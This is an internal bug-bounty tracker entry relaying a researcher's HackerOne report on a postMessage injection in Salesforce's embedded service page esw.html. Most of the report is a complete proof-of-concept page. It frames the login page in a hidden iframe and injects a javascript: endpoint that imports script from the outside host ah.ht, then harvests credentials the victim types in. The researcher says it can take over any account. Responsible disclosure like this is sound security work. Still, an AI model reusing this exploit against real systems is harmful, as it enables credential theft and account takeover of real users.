DO NOT CLOSE THIS INVESTIGATION WHEN THE CHILD BUG IS CREATED



This is a security vulnerability reported via our external Bug Bounty Program. H1 Report #923871. If you feel you require access to H1 for additional details or to interact with the researcher in order to reproduce or remediate this bug, please submit an access request here https://sfdc.co/BugBountyOnboarding.



Before closing bugs without a fix (not a bug, never, not reproducible) please @mention your prodsec contact to clarify the reason. If you are not sure about your prodsec contact, please @mention @[Product Security]



Feel free to check out the following documentation describing the meaning of the status of Bug Bounty bugs: https://salesforce.quip.com/kFqEA6HhuSDz



Vulnerability Details from Researcher



Summary
First of all, I want to clarify that this is a different attack vector than the one on #923340.

When I was making more tests on the esw.html file, in their different versions, and I found a total different but successfully exploitable vector.

The PoC.
This PoC uses the same payload that could take over any salesforce account, that I sent in my previous report.

Open a new incognito window on firefox or chrome.
Go To https://ah.ht/sf3.html (make sure is on HTTPS)
Click on login with Salesforce
put any credentials
A popup will show up with your creds.
The PoC in Deep:
<html>
<head>

</head>

<body>Hello, this page requires authentication please use the following platforms to login:<br/><br/>
Login with facebook<br/>
Login with Google<br/></body>


<script>

var profileIframe = document.createElement('iframe');
profileIframe.setAttribute('src', 'https://login.salesforce.com/embeddedservice/4.0/esw.html?parent=https://ah.ht');
profileIframe.setAttribute('id', 'pi');
profileIframe.setAttribute('width', '200');
profileIframe.setAttribute('height', '50');
profileIframe.setAttribute('style', 'border:none;display:none');
document.body.appendChild(profileIframe);

document.getElementById('pi').onload = function() {

    profileIframe.contentWindow.postMessage({"domain":document.domain,"data":"Chasitor","method":"script.load"},'*');


    setTimeout(function(){ profileIframe.contentWindow.postMessage({"domain":document.domain,"data":{"settingsObj":{"chasitorSrc":"https://c.la1-c2-phx.salesforceliveagent.com/content/g/js/48.0/chasitor.js","eswLiveAgentDevName":"EmbeddedServiceLiveAgent_Parent04I0M000000PAsDUAW_15f4f60cb08","endpointURL":"javascript:import('https://ah.ht/sf2.php')//","contentServerURL":"https://ah.ht/?","orgId":"00D000000000062","deploymentId":"57230000000DmsR","buttonId":"57330000000MBlR","visitorInfo":{"visitCount":5,"originalReferrer":"","pages":[{"location":"https://www.salesforce.com/crm/what-is-crm/","time":1594659984664},{"location":"https://www.salesforce.com/products/platform/products/force/","time":1594659529058}]},"fallbackRouting":[],"isQueuePositionEnabled":false,"chatbotVersion":null},"hasOnlyExtraPrechatInfo":false,"prechatFormDetails":[],"prechatEntities":[]},"method":"chasitor.load"},'*');},'1000');

    setTimeout(function(){
        profileIframe.setAttribute('style', 'border:none');
    },'2000');


}

</script>
</html>
